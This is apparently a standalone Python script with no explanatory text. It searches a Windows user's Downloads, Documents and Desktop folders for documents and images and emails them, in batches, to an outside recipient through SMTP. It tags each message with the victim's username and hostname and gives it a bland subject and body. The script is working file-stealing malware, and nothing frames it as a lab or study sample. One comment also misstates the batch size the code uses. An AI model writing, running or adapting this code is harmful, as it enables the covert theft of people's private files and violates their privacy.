import os
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import json
import socket

# Load credentials from the JSON file
with open("credentials.json", "r") as f:
    credentials = json.load(f)

# Get email credentials
email_config = credentials["email"]
SMTP_SERVER = email_config["smtp_server"]
SMTP_PORT = email_config["smtp_port"]
EMAIL_ACCOUNT = email_config["email_account"]
EMAIL_PASSWORD = email_config["email_password"]
RECIPIENT = email_config["recipient"]

# Get username and hostname
username = os.getlogin()
hostname = socket.gethostname()

# Directories to search
target_directories = [
    os.path.expanduser("~\\Downloads"),      # Downloads folder
    os.path.expanduser("~\\Documents"),      # Documents folder
    os.path.expanduser("~\\Desktop")         # Desktop folder
]

# File types to search for
file_types = [".txt", ".docx", ".pdf", ".jpg", ".png", ".pptx", ".xlsx"]

# Function to send email with attachments
def send_email(subject, body, attachments):
    try:
        # Create the email
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ACCOUNT
        msg['To'] = RECIPIENT
        msg['Subject'] = f"{subject} {username} {hostname}"  # Include username and hostname
        msg.attach(MIMEText(body, 'plain'))

        # Attach files
        for file_path in attachments:
            with open(file_path, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    f"attachment; filename={os.path.basename(file_path)}",
                )
                msg.attach(part)

        # Connect to the SMTP server
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ACCOUNT, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ACCOUNT, RECIPIENT, msg.as_string())
        server.quit()
        print(f"Email sent with {len(attachments)} attachments.")
    except Exception as e:
        print(f"Error sending email: {e}")

# Search and send files
for directory in target_directories:
    files_to_send = []  # Store files to send in batches of 3
    for root, dirs, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ft) for ft in file_types):
                file_path = os.path.join(root, file)
                try:
                    # Add file to email batch
                    files_to_send.append(file_path)
                    if len(files_to_send) == 10:  # Send 3 files per email
                        send_email("Files Update", "Here are the requested files.", files_to_send)
                        files_to_send = []  # Reset the batch

                    time.sleep(0.5)  # Delay to prevent rate limiting
                except Exception as e:
                    print(f"Error processing {file_path}: {e}")

    # Send any remaining files in the last batch
    if files_to_send:
        send_email("Files Update", "Here are the requested files.", files_to_send)